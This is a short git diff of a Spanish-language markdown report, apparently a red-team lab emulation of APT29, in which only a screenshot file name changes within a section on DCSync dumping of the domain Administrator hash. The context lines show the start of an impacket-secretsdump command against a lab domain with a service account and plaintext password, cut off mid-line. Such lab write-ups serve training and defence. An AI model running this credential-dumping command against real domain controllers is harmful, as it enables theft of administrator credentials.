@@ -16,7 +16,7 @@ APT29 utiliza DCSync como técnica final de recolección de credenciales — per
 
 ## 10.1 — DCSync: Volcado de hash del Administrador
 **Técnica MITRE:** T1003.006 — OS Credential Dumping: DCSync  
-**Captura:** ![fase10-01](../screenshots/FASE-10-Objective-Completion/fase10-01-dcsync-administrator.png)
+**Captura:** ![fase10-01](../screenshots/FASE-10-Objective-Completion/fase10-01-dcsync-administrator-hash.png)
 
 ```bash
 impacket-secretsdump atackcorp.local/backup_svc:'Backup2024!'@10.0.2.10 \
